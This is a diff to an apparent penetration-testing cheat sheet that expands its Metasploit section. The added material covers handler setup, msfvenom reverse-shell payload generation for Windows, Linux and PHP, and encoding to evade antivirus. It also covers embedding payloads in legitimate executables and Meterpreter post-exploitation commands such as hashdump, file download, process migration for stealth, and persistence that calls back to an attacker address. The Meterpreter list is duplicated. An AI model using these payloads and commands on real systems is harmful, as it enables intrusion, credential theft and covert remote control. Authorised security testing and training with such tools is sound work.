@@ -212,18 +212,91 @@ binwalk -Y <file> # Scans for YARA rule matches (custom pattern signatures)
 # Penetration testing
 
 ## Metasploit
-use exploit/multi/handler # Starts a Metasploit listener to catch incoming reverse shell connections from a deployed payload.
-set payload windows/meterpreter/reverse_tcp # Sets the payload to match the one used when generating the executable.
-set LHOST <Attacker's IP Address> # Specifies the attacker's IP address to listen on.
-set LPORT <Attacker's Port Number> # Specifies the port to listen on for the incoming connection.
-exploit  # Launches the handler and awaits the reverse connection from the target.
+### Variable Reference
 
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attacker's IP Address> LPORT=<Attacker's Port Number> -f exe -o /path/to/output/payload.exe  # Generates a Windows Meterpreter reverse TCP payload as an executable, connecting back to the specified IP address and port upon execution.
+LHOST / LPORT # Always YOUR (attacker) machine - IP/port Metasploit listens on or connects from
+RHOST / RHOSTS # The target machine(s) being scanned or exploited
+RPORT # The port on the target machine
+
+#### Metasploit — Core Workflow
+
+msfconsole # Launches the Metasploit console
+search <keyword/CVE> # Searches for modules matching a keyword, CVE, or platform
+use <module path> # Loads a specific exploit, auxiliary, or scanner module
+info # Displays details about the currently loaded module
+show options # Lists all configurable options for the current module
+show payloads # Lists compatible payloads for the current exploit
+set <OPTION> <value> # Sets a module option (e.g. RHOSTS, LHOST, LPORT)
+setg <OPTION> <value> # Sets an option globally, persisting across module changes
+unset <OPTION> # Clears a previously set option
+check # Verifies if the target is vulnerable, without exploiting (not supported by all modules)
+run / exploit # Executes the current module
+run -j / exploit -j # Runs the module as a background job, freeing the console for other tasks
+sessions -l # Lists all active sessions
+sessions -i <ID> # Interacts with a specific session by ID
+background # Backgrounds the current session, returning to the msfconsole prompt
+
+#### Metasploit — Reverse Shell Handler (target connects to you)
+
+use exploit/multi/handler # Starts a listener to catch incoming connections from a deployed reverse payload
+set payload windows/meterpreter/reverse_tcp # Sets the payload to match the one used when generating the executable
+set LHOST <attacker's IP Address> # Your IP address to listen on
+set LPORT <attacker's Port Number> # Your port to listen on for the incoming connection
+exploit # Launches the handler and awaits the reverse connection from the target
+run -j # Runs the handler as a background job so the console stays free
+
+#### Metasploit — Bind Shell Handle
+
+use exploit/multi/handler # Starts a handler to connect out to a waiting payload on the target
+set payload windows/meterpreter/bind_tcp # Sets the payload to match the one used when generating the executable
+set RHOST <target's IP Address> # The target machine to connect to
+set LPORT <target's Port Number> # The port on the target machine that is listening
+exploit # Connects out to the target's listening payload
+
+### msfvenom — Payload Generation
+
+msfvenom -l payloads # Lists all available payloads
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker's IP Address> LPORT=<attacker's Port Number> -f exe -o /path/to/output/payload.exe # Generates a Windows Meterpreter reverse TCP payload as an executable
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker's IP Address> LPORT=<attacker's Port Number> -f elf -o /path/to/output/payload.elf # Generates a Linux Meterpreter reverse TCP payload as an ELF binary
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker's IP Address> LPORT=<attacker's Port Number> -f exe -e x86/shikata_ga_nai -i 5 -o /path/to/output/payload.exe # Generates a 64-bit payload, encoded 5 times with shikata_ga_nai to help evade basic signature-based detection
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<attacker's IP Address> LPORT=<attacker's Port Number> -f raw -o /path/to/output/payload.php # Generates a PHP Meterpreter reverse TCP payload for web server exploitation
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker's IP Address> LPORT=<attacker's Port Number> -f exe -x <legit.exe> -k -o /path/to/output/payload.exe # Embeds the payload inside a legitimate executable, keeping the original program's functionality (-k)
+msfvenom -p windows/meterpreter/bind_tcp LPORT=<target's Port Number> -f exe -o /path/to/output/payload.exe # Generates a bind shell payload — the target listens on this port for an incoming connection
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker's IP Address> LPORT=<attacker's Port Number> -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 3 -x /path/to/input.exe -f exe -o /path/to/output/payload.exe # Chains msfvenom calls to inject and re-encode a payload into an existing binary
+
+### msfconsole One-Liner
+
+msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <attacker's IP Address>; set LPORT <attacker's Port Number>; run" # Launches msfconsole and auto-configures/starts a handler in one line, useful for scripting
 
 ### Meterpreter Commands
-sysinfo  # To view the victim's system information
-shell  # To access the command line on the victim's computer
-screenshot  # To take a screenshot of the victim's screen´
+
+sysinfo # View the victim's system information
+getuid # Displays the user context Meterpreter is currently running as
+shell # Access the command line on the victim's computer
+ps # Lists running processes on the target
+migrate <PID> # Moves the Meterpreter session into another process (improves stability/stealth)
+screenshot # Take a screenshot of the victim's screen
+hashdump # Dumps password hashes from the target's SAM database (requires SYSTEM privileges)
+download <remote file> <local path> # Downloads a file from the target to the attacker machine
+upload <local file> <remote path> # Uploads a file from the attacker machine to the target
+sessions -l # Lists all active sessions
+background # Backgrounds the current session, returning to the msfconsole prompt
+
+### Meterpreter Commands
+
+sysinfo # To view the victim's system information
+shell # To access the command line on the victim's computer
+screenshot # To take a screenshot of the victim's screen
+getuid # Displays the user context Meterpreter is currently running as
+ps # Lists running processes on the target
+migrate <PID> # Moves the Meterpreter session into another process (improves stability/stealth)
+hashdump # Dumps password hashes from the target's SAM database (requires SYSTEM privileges)
+download <remote file> <local path> # Downloads a file from the target to the attacker machine
+upload <local file> <remote path> # Uploads a file from the attacker machine to the target
+persistence -U -i 5 -p <port> -r <attacker's IP Address> # Establishes persistence, reconnecting every 5 seconds on user login (older Meterpreter script, check for newer persistence modules)
+background # Backgrounds the current session, returning to the msfconsole prompt
+sessions -l # Lists all active sessions
+sessions -i <ID> # Interacts with a specific session by ID
 
 ## Wpscan
 
